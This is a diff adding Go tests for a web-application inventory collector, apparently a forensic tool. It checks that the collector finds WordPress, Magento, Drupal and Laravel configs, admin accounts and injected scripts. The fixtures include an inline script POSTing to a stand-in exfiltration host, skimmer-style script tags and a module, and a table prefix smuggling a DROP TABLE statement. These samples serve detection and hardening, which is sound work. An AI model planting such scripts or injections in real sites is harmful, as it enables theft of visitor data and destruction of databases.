@@ -1,0 +1,233 @@
+package apps
+
+import (
+	"context"
+	"errors"
+	"slices"
+	"strings"
+	"testing"
+	"testing/fstest"
+
+	"github.com/cpibia/tripwatch/internal/collector"
+)
+
+func text(s string) *fstest.MapFile { return &fstest.MapFile{Data: []byte(s), Mode: 0o644} }
+
+// fakeDB answers each query with the rows of the first entry whose key it contains.
+type fakeDB struct {
+	answers map[string][]map[string]string
+	queries []string
+}
+
+func (f *fakeDB) query(_ context.Context, q string, _ ...any) ([]map[string]string, error) {
+	f.queries = append(f.queries, q)
+	for k, rows := range f.answers {
+		if strings.Contains(q, k) {
+			return rows, nil
+		}
+	}
+	return nil, nil
+}
+
+func connectTo(db *fakeDB, seen *dbConfig) func(context.Context, collector.Source, dbConfig) (querier, func(), error) {
+	return func(_ context.Context, _ collector.Source, cfg dbConfig) (querier, func(), error) {
+		*seen = cfg
+		return db, func() {}, nil
+	}
+}
+
+func collect(t *testing.T, fsys fstest.MapFS, c Collector) Result {
+	t.Helper()
+	out, err := c.Collect(context.Background(), collector.Source{FS: fsys})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return out.(Result)
+}
+
+const wpConfig = `<?php
+// define('DB_PASSWORD', 'sample-not-used');
+define( 'DB_NAME', 'blog' );
+define( 'DB_USER', 'blog' );
+define( 'DB_PASSWORD', 'p4ss\'word' );
+define( 'DB_HOST', 'db:3307' );
+$table_prefix = 'wpx_';
+define( 'WP_DEBUG', true );
+`
+
+func TestWordPress(t *testing.T) {
+	db := &fakeDB{answers: map[string][]map[string]string{
+		"usermeta": {{"ID": "1", "user_login": "admin", "user_email": "admin@example.com", "user_registered": "2024-01-01 10:00:00"},
+			{"ID": "7", "user_login": "wp_support", "user_email": "x@example.invalid", "user_registered": "2026-10-20 03:12:00"}},
+		"option_name IN": {{"option_name": "siteurl", "option_value": "https://blog.example.com"},
+			{"option_name": "active_plugins", "option_value": `a:2:{i:0;s:19:"akismet/akismet.php";i:1;s:15:"x/wp-cache.php";}`}},
+		"options WHERE option_value LIKE": {{"option_name": "widget_custom_html", "option_value": `<script src="https://cdn-stats.example.net/a.js"></script>`}},
+		"posts WHERE":                     {{"ID": "42", "post_type": "page", "post_content": `<script>fetch("https://exfil.example.org/x",{method:"POST"})</script>`}},
+	}}
+	var seen dbConfig
+	res := collect(t, fstest.MapFS{"var/www/blog/wp-includes/version.php": text("<?php $wp_version = '6.6';"), "var/www/blog/wp-config.php": text(wpConfig)},
+		Collector{Connect: connectTo(db, &seen)})
+
+	if len(res.Apps) != 1 {
+		t.Fatalf("apps = %+v", res.Apps)
+	}
+	p := res.Apps[0]
+	if seen.Name != "blog" || seen.Password != `p4ss\'word` || seen.Host != "db" || seen.Port != "3307" || seen.Prefix != "wpx_" {
+		t.Errorf("config = %+v", seen)
+	}
+	if p.Database != "blog@db:3307" || strings.Contains(p.Database, "p4ss") {
+		t.Errorf("database = %q", p.Database)
+	}
+	if len(p.Admins) != 2 || p.Admins[1].Name != "wp_support" {
+		t.Errorf("admins = %+v", p.Admins)
+	}
+	if !slices.Equal(p.Extensions, []string{"akismet/akismet.php", "x/wp-cache.php"}) || p.Settings["siteurl"] != "https://blog.example.com" {
+		t.Errorf("extensions %v settings %v", p.Extensions, p.Settings)
+	}
+	wantInjected := []Injected{
+		{Where: "option widget_custom_html", Domains: []string{"cdn-stats.example.net"}},
+		{Where: "page 42", Domains: []string{"exfil.example.org"}, Inline: true},
+	}
+	if len(p.Injected) != 2 || p.Injected[0].Where != wantInjected[0].Where || !slices.Equal(p.Injected[0].Domains, wantInjected[0].Domains) ||
+		!p.Injected[1].Inline || !slices.Equal(p.Injected[1].Domains, wantInjected[1].Domains) {
+		t.Errorf("injected = %+v", p.Injected)
+	}
+	if !slices.Contains(p.Warnings, "WP_DEBUG is enabled") {
+		t.Errorf("warnings = %v", p.Warnings)
+	}
+	for _, q := range db.queries {
+		if !strings.HasPrefix(strings.TrimSpace(q), "SELECT") || !strings.Contains(q, "wpx_") {
+			t.Errorf("query %q", q)
+		}
+	}
+}
+
+const magentoEnv = `<?php
+return [
+    'backend' => ['frontName' => 'admin_x7k'],
+    'db' => [
+        'table_prefix' => '',
+        'connection' => [
+            'default' => [
+                'host' => 'localhost',
+                'dbname' => 'shop',
+                'username' => 'shop',
+                'password' => 'secret',
+            ]
+        ]
+    ],
+    'MAGE_MODE' => 'developer',
+];`
+
+func TestMagento(t *testing.T) {
+	db := &fakeDB{answers: map[string][]map[string]string{
+		"admin_user": {{"user_id": "1", "username": "admin", "email": "a@example.com", "created": "2023-01-01", "logdate": "2026-10-21", "is_active": "1"}},
+		"core_config_data": {{"path": "design/footer/absolute_footer", "scope": "default", "scope_id": "0", "value": `<script src="//checkout-assets.example.net/x.js"></script>`},
+			{"path": "web/secure/base_url", "scope": "default", "scope_id": "0", "value": "https://shop.example.com/"}},
+		"cms_block": {{"id": "3", "identifier": "footer_links", "content": `<script>var s=document.createElement("script");s.src="https://cdn.example.org/s.js"</script>`}},
+	}}
+	var seen dbConfig
+	res := collect(t, fstest.MapFS{
+		"var/www/shop/bin/magento":        text(""),
+		"var/www/shop/app/etc/di.xml":     text(""),
+		"var/www/shop/app/etc/env.php":    text(magentoEnv),
+		"var/www/shop/app/etc/config.php": text("<?php return ['modules' => ['Magento_Store' => 1, 'Vendor_Skimmer' => 1, 'Magento_Off' => 0]];"),
+	}, Collector{Connect: connectTo(db, &seen)})
+
+	p := res.Apps[0]
+	if seen.Name != "shop" || seen.Host != "localhost" || p.Settings["admin_path"] != "admin_x7k" || p.Settings["mode"] != "developer" {
+		t.Errorf("config %+v settings %v", seen, p.Settings)
+	}
+	if !slices.Equal(p.Extensions, []string{"Magento_Store", "Vendor_Skimmer"}) {
+		t.Errorf("modules = %v", p.Extensions)
+	}
+	if len(p.Admins) != 1 || len(p.Injected) != 2 || p.Injected[0].Domains[0] != "checkout-assets.example.net" || p.Injected[1].Domains[0] != "cdn.example.org" {
+		t.Errorf("admins %+v injected %+v", p.Admins, p.Injected)
+	}
+	if p.Settings["web/secure/base_url@default:0"] != "https://shop.example.com/" {
+		t.Errorf("settings = %v", p.Settings)
+	}
+	if !slices.ContainsFunc(p.Warnings, func(w string) bool { return strings.Contains(w, "developer") }) {
+		t.Errorf("warnings = %v", p.Warnings)
+	}
+}
+
+func TestDrupalAndLaravel(t *testing.T) {
+	db := &fakeDB{answers: map[string][]map[string]string{
+		"users_field_data": {{"uid": "1", "name": "admin", "mail": "a@example.com", "created": "1700000000", "access": "0", "status": "1"}},
+		"core.extension":   {{"data": `a:3:{s:6:"module";a:2:{s:5:"block";i:0;s:4:"node";i:0;}s:5:"theme";a:1:{s:4:"olivero";i:0;}s:7:"profile";s:8:"standard";}`}},
+	}}
+	var seen dbConfig
+	res := collect(t, fstest.MapFS{
+		"var/www/site/core/lib/Drupal.php": text("const VERSION = '10.1.0';"),
+		"var/www/site/sites/default/settings.php": text(`<?php
+$databases['default']['default'] = array (
+  'database' => 'drupal', 'username' => 'drupal', 'password' => 'pw', 'prefix' => '', 'host' => 'mariadb', 'port' => '3306', 'driver' => 'mysql',
+);`),
+		"srv/api/artisan":           text(""),
+		"srv/api/bootstrap/app.php": text(""),
+		"srv/api/.env":              text("APP_ENV=production\nAPP_DEBUG=true\nAPP_KEY=\nDB_CONNECTION=pgsql\nDB_DATABASE=api\n"),
+	}, Collector{Connect: connectTo(db, &seen)})
+
+	byPath := map[string]Profile{}
+	for _, p := range res.Apps {
+		byPath[p.Path] = p
+	}
+	d := byPath["/var/www/site"]
+	if seen.Name != "drupal" || len(d.Admins) != 1 || d.Admins[0].Created != "2023-11-14T22:13:20Z" || !slices.Equal(d.Extensions, []string{"block", "node"}) {
+		t.Errorf("drupal = %+v (config %+v)", d, seen)
+	}
+	l := byPath["/srv/api"]
+	if l.Database != "" || len(l.Warnings) != 2 || !slices.ContainsFunc(l.Issues, func(s string) bool { return strings.Contains(s, "pgsql") }) {
+		t.Errorf("laravel = %+v", l)
+	}
+}
+
+func TestHostilePrefixAndUnreachableDatabase(t *testing.T) {
+	fsys := fstest.MapFS{
+		"var/www/blog/wp-includes/version.php":  text("<?php"),
+		"var/www/blog/wp-config.php":            text("<?php define('DB_NAME','b'); $table_prefix = 'wp_users; DROP TABLE x; --';"),
+		"var/www/other/wp-includes/version.php": text("<?php"),
+		"var/www/other/wp-config.php":           text("<?php define('DB_NAME','o'); define('DB_HOST','db');"),
+	}
+	called := 0
+	res := collect(t, fsys, Collector{Connect: func(context.Context, collector.Source, dbConfig) (querier, func(), error) {
+		called++
+		return nil, nil, errors.New("connection refused")
+	}})
+	if called != 1 {
+		t.Errorf("connected %d times, want only for the valid prefix", called)
+	}
+	for _, p := range res.Apps {
+		if len(p.Issues) == 0 || p.Reachable {
+			t.Errorf("%s: %+v", p.Path, p)
+		}
+	}
+}
+
+// Containerised applications take their database settings from the environment.
+func TestDrupalSettingsFromEnvironment(t *testing.T) {
+	var seen dbConfig
+	fsys := fstest.MapFS{
+		"var/www/site/core/lib/Drupal.php": text("const VERSION = '10.6.0';"),
+		"var/www/site/sites/default/settings.php": text(`<?php
+$databases['default']['default'] = [
+  'database' => getenv('DRUPAL_DB_NAME') ?: 'drupal',
+  'username' => getenv('DRUPAL_DB_USER') ?: 'drupal',
+  'password' => getenv('DRUPAL_DB_PASSWORD') ?: '',
+  'host' => getenv('DRUPAL_DB_HOST') ?: 'localhost',
+  'driver' => 'mysql',
+];`),
+		"var/www/site/sites/default/settings.local.php": text(`<?php $databases['default']['default']['port'] = '3307'; $databases['default']['default'] = ['database' => 'override', 'port' => '3307'];`),
+		"proc/1/comm":     text("tini\n"),
+		"proc/1/status":   text("Name:\ttini\nPPid:\t0\n"),
+		"proc/1/environ":  text("PATH=/usr/bin\x00DRUPAL_DB_HOST=mariadb\x00DRUPAL_DB_PASSWORD=pw\x00"),
+		"proc/50/comm":    text("php-fpm8.2\n"),
+		"proc/50/status":  text("Name:\tphp-fpm8.2\nPPid:\t1\n"),
+		"proc/50/environ": text("PATH=/usr/bin\x00"),
+	}
+	collect(t, fsys, Collector{Connect: connectTo(&fakeDB{}, &seen)})
+	if seen.Host != "mariadb" || seen.Password != "pw" || seen.User != "drupal" || seen.Name != "override" || seen.Port != "3307" {
+		t.Errorf("config = %+v", seen)
+	}
+}
